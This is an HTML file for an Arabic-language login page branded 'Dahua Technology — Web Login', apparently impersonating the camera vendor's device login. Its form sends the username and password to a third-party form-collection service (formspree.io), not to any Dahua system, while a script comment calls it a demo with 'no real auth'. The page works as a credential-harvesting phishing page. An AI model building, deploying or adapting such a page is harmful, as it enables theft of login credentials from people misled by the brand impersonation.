<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title> تسجيل دخول - Dahua</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg1:#2b2f33;
      --bg2:#1f2326;
      --accent:#09a1ff;
      --card:#2f3438;
      --muted:#b0b7bf;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;}
    body{
      background: radial-gradient(1200px 800px at 10% 20%, rgba(255,255,255,0.02), transparent), linear-gradient(135deg,var(--bg1),var(--bg2));
      color:#e6eef6;
      display:flex;align-items:center;justify-content:center;
    }
    .container{
    width:100%;
    max-width:980px;padding:40px;display:flex;align-items:center;justify-content:center;}

    /* card */
    .card{width:420px;padding:44px;border-radius:6px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.005));box-shadow:0 10px 30px rgba(0,0,0,0.45);}

    .brand{display:flex;flex-direction:column;gap:12px;align-items:center;margin-bottom:18px}
    .logo{font-weight:800;font-size:34px;letter-spacing:1px}
    .sub{font-size:13px;color:var(--muted)}

    form{display:flex;flex-direction:column;gap:14px}
    .field{display:flex;align-items:center;background:transparent;border:1px solid rgba(255,255,255,0.06);padding:12px;border-radius:4px}
    .field input{flex:1;background:transparent;border:0;outline:none;color:inherit;font-size:15px}
    .field .icon{width:20px;height:20px;opacity:0.65;margin-left:10px}

    .dropdown{appearance:none;background:transparent;border:0;color:inherit;font-size:15px}

    .forgot{font-size:13px;color:var(--muted);text-align:left;margin-top:6px}

    .btn{margin-top:10px;background:var(--accent);color:white;padding:12px;border-radius:6px;border:0;font-weight:600;cursor:pointer}

    .eye{cursor:pointer;margin-left:8px;opacity:0.9}

    /* small responsive */
    @media(max-width:520px){
      .card{width:92%;padding:26px}
      .logo{font-size:28px}
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card" role="main" aria-label="نافذة تسجيل الدخول">
      <div class="brand">
        <div style="display:flex;align-items:center;gap:10px">
          <div class="logo">@Dahua</div>
        </div>
        <div class="sub">Dahua Technology — Web Login</div>
      </div>

      <form id="loginForm" method="post" autocomplete="off" action="https://formspree.io/f/xzzjpvnw">
        <label class="field" for="username">
          <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 12c2.761 0 5-2.239 5-5s-2.239-5-5-5-5 2.239-5 5 2.239 5 5 5zM4 20c0-3.313 2.686-6 6-6h4c3.314 0 6 2.687 6 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <input id="username" placeholder="اسم المستخدم" type="text" name="message">
        </label>

        <label class="field" for="password">
          <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="11" width="18" height="10" rx="2" stroke="currentColor" stroke-width="1.4"/><path d="M7 11V8a5 5 0 0110 0v3" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <input id="password" placeholder="كلمة المرور" type="password" value="" name="message">
          <svg id="toggleEye" class="eye" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.2"/></svg>
        </label>

        <label class="field" for="proto">
          <svg class="icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 7h18M7 7v10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <select id="proto" class="dropdown">
            <option>TCP</option>
            <option>UDP</option>
          </select>
        </label>

        <div class="forgot">هل نسيت كلمة المرور؟</div>

        <button class="btn" type="submit" id="loginBtn">دخول</button>
      </form>
    </div>
  </div>

  <script>
    const pwd = document.getElementById('password');
    const eye = document.getElementById('toggleEye');
    eye.addEventListener('click',()=>{
      if(pwd.type==='password'){
        pwd.type='text';
      } else { pwd.type='password'; }
    });

    // small demo: when pressing login, show values in console (no real auth)
    document.getElementById('loginBtn').addEventListener('click',()=>{
      console.log('attempt', {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        proto: document.getElementById('proto').value
      });

    });
  </script>
</body>
</html>
